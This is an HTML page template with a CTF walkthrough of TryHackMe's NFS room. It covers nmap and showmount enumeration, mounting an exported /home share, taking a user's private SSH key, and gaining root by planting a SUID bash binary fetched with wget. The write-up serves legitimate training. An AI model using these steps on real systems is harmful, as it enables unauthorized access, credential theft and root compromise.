{% extends "base.html" %}

{% block title %}
Intro to Networking
{% endblock %}

{% block content %}
<div class="container">
    <h1 id="typing-effect" class="display-2 mb-4"></h1>
    <br />

    <div class="solution-div">
        <p>
            On this page, I'll demonstrate how to solve the Exploiting NFS - Network Services 2 CTF room on the TryHackMe platform.
        </p>

        <h2>Enumeration</h2>

        <p>
            As always, we kick off our network enumeration process using Nmap. A simple Nmap scan reveals the following:
        </p>

        <div class="shrink">
            <pre>
                <code id="text" class="hljs language-bash">
                └─$ nmap 10.10.157.56 -oN simple-nmap.out
                Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 16:38 -03
                Nmap scan report for 10.10.157.56
                Host is up (0.27s latency).
                Not shown: 997 closed tcp ports (conn-refused)
                PORT     STATE SERVICE
                22/tcp   open  ssh
                111/tcp  open  rpcbind
                2049/tcp open  nfs
                
                Nmap done: 1 IP address (1 host up) scanned in 38.23 seconds
                </code>
            </pre>
        </div>

        <p>
            Let's delve deeper into port 2049 by running an aggressive scan.
        </p>

        <div class="shrink">
            <pre>
                <code id="text" class="hljs language-bash">
                └─$ nmap -A -p 2049 10.10.157.56 -oN aggressive-p2049-nmap.out
                Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 16:41 -03
                Nmap scan report for 10.10.157.56
                Host is up (0.24s latency).
                
                PORT     STATE SERVICE VERSION
                2049/tcp open  nfs     3-4 (RPC #100003)
                
                Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
                Nmap done: 1 IP address (1 host up) scanned in 14.09 seconds
                </code>
            </pre>
        </div>

        <p>
            The aggressive Nmap scan reveals that the RPC protocol version is 3 or 4. That's promising. Let's use the 'showmount' command to see which shares are available on this server.
        </p>

        <div class="shrink">
            <pre>
                <code id="text" class="hljs language-bash">
                └─$ showmount -e 10.10.157.56
                Export list for 10.10.157.56:
                /home *
                </code>
            </pre>
        </div>

        <p>
            This shows a share called '/home.' Let's mount it. First, we create a temporary directory with the command 'mkdir /tmp/mount' and then we mount it using the 'mount' command:
        </p>

        <div class="shrink">
            <pre>
                <code id="text" class="hljs language-bash">
                sudo mount -t nfs 10.10.157.56:home /tmp/mount -nolock
                </code>
            </pre>
        </div>

        <p>
            After successfully mounting, we navigate to the temporary directory to inspect its contents.
        </p>

        <div class="shrink">
            <pre>
                <code id="text" class="hljs language-bash">
                └─$ pwd & ls
                [1] 1771912
                /tmp/mount
                [1]  + done       pwd
                cappucino
                </code>
            </pre>
        </div>

        <p>
            We've discovered a directory named 'cappucino.' Let's investigate its contents. A simple 'ls' command reveals nothing, so let's run 'ls -la' to find hidden directories:
        </p>

        <div class="shrink">
            <pre>
                <code id="text" class="hljs language-bash">
                └─$ ls -la
                total 36
                drwxr-xr-x 5 alex alex 4096 Jun  4  2020 .
                drwxr-xr-x 3 root root 4096 Apr 21  2020 ..
                -rw------- 1 alex alex    5 Jun  4  2020 .bash_history
                -rw-r--r-- 1 alex alex  220 Apr  4  2018 .bash_logout
                -rw-r--r-- 1 alex alex 3771 Apr  4  2018 .bashrc
                drwx------ 2 alex alex 4096 Apr 22  2020 .cache
                drwx------ 3 alex alex 4096 Apr 22  2020 .gnupg
                -rw-r--r-- 1 alex alex  807 Apr  4  2018 .profile
                drwx------ 2 alex alex 4096 Apr 22  2020 .ssh
                -rw-r--r-- 1 alex alex    0 Apr 22  2020 .sudo_as_admin_successful
                </code>
            </pre>
        </div>

        <p>
            We have a '.ssh' directory, which contains an 'id_rsa' file, a private key that might allow us to SSH into the server. Let's copy that file. The username must be 'cappucino.'
        </p>

        <h2>Exploitation</h2>

        <p>
            Now that we've found the private SSH key ('id_rsa'), we can use it to SSH into the server. The username we should try to log in with is 'cappucino' (the name of the NFS '/home' share directory). First, we grant permissions to the key using 'chmod 600 id_rsa.' Then, we attempt to SSH:
        </p>

        <div class="shrink">
            <pre>
                <code id="text" class="hljs language-bash">
                └─$ ssh -i id_rsa cappucino@10.10.157.56
                The authenticity of host '10.10.157.56 (10.10.157.56)' can't be established.
                ED25519 key fingerprint is SHA256:KJ8GpDRYCTgSot8NqCbqRhNYCUarQAXuwbVuII32x/U.
                This key is not known by any other names.
                Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
                Warning: Permanently added '10.10.157.56' (ED25519) to the list of known hosts.
                Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
                
                 * Documentation:  https://help.ubuntu.com
                 * Management:     https://landscape.canonical.com
                 * Support:        https://ubuntu.com/advantage
                
                  System information as of Wed Aug 23 19:52:44 UTC 2023
                
                  System load:  0.0               Processes:           102
                  Usage of /:   45.2% of 9.78GB   Users logged in:     0
                  Memory usage: 16%               IP address for eth0: 10.10.157.56
                  Swap usage:   0%
                
                
                44 packages can be updated.
                0 updates are security updates.
                
                
                Last login: Thu Jun  4 14:37:50 2020
                cappucino@polonfs:~$
                </code>
            </pre>
        </div>

        <p>
            There isn't much here; maybe we need to access the '/root' folder. However, 'cappucino' has limited privileges, so we must find a way to escalate privileges. The following command shows that SSH access provides the same files as in the NFS share:
        </p>

        <div class="shrink">
            <pre>
                <code id="text" class="hljs language-bash">
                cappucino@polonfs:~$ ls -la
                total 36
                drwxr-xr-x 5 cappucino cappucino 4096 Jun  4  2020 .
                drwxr-xr-x 3 root      root      4096 Apr 21  2020 ..
                -rw------- 1 cappucino cappucino    5 Jun  4  2020 .bash_history
                -rw-r--r-- 1 cappucino cappucino  220 Apr  4  2018 .bash_logout
                -rw-r--r-- 1 cappucino cappucino 3771 Apr  4  2018 .bashrc
                drwx------ 2 cappucino cappucino 4096 Apr 22  2020 .cache
                drwx------ 3 cappucino cappucino 4096 Apr 22  2020 .gnupg
                -rw-r--r-- 1 cappucino cappucino  807 Apr  4  2018 .profile
                drwx------ 2 cappucino cappucino 4096 Apr 22  2020 .ssh
                -rw-r--r-- 1 cappucino cappucino    0 Apr 22  2020 .sudo_as_admin_successful
                cappucino@polonfs:~$
                </code>
            </pre>
        </div>

        <h3>SUID Files</h3>

        <p>
            Remote root users are assigned a user called "nfsnobody" when connected, which has the lowest local privileges. Not what we want. However, if this is disabled, it can allow the creation of SUID bit files, granting a remote user root access to the connected system. So, what are files with the SUID bit set? Essentially, this means that the file(s) can be run with the permissions of the file(s) owner/group, in this case, as the super-user. We can leverage this to gain a shell with these privileges. Let's try uploading files to the NFS share and control the permissions of these files. If all goes well, we can set the permissions of whatever we upload, in this case, a bash shell executable.
        </p>

        <p>
            Let's exit the SSH terminal and return to '/tmp/mount/cappucino.' There, we will download the bash shell using:
        </p>

        <pre>
            <code id="text" class="hljs language-python">
            wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
            </code>
        </pre>

        <p>
            After that, we can run the command 'sudo chown root bash' to change the ownership of this downloaded shell to the root user. Note that if we were to do this inside the SSH terminal, we would not have the privilege to do so. That's why we are doing it within the NFS share, which has a root-squash misconfiguration. Following the 'chown' command, we execute the following command to make it executable by any user: 'sudo chmod +sx bash.'
        </p>

        <p>
            Let's SSH into the machine again. Note that we have successfully uploaded the bash file with the correct privileges!
        </p>

        <div class="shrink">
            <pre>
                <code id="text" class="hljs language-bash">
                cappucino@polonfs:~$ ls -la bash
                -rwsr-sr-x 1 root cappucino 1113504 Aug 23 20:02 bash
                cappucino@polonfs:~$
                </code>
            </pre>
        </div>

        <p class="no-justify">We can run this file to gain a root user shell:</p>

        <div class="shrink">
            <pre>
                <code id="text" class="hljs language-bash">
                cappucino@polonfs:~$ ./bash -p
                bash-4.4# whoami
                root
                bash-4.4#
                </code>
            </pre>
        </div>

        <p>
            The '-p' option persists the permissions, allowing it to run as root with SUID. Otherwise, bash might drop the permissions. Now, we just need to 'cd /root' and retrieve the flag!
        </p>

        <a href="/ctfs">Go back</a>
    </div>
</div>
{% endblock %}
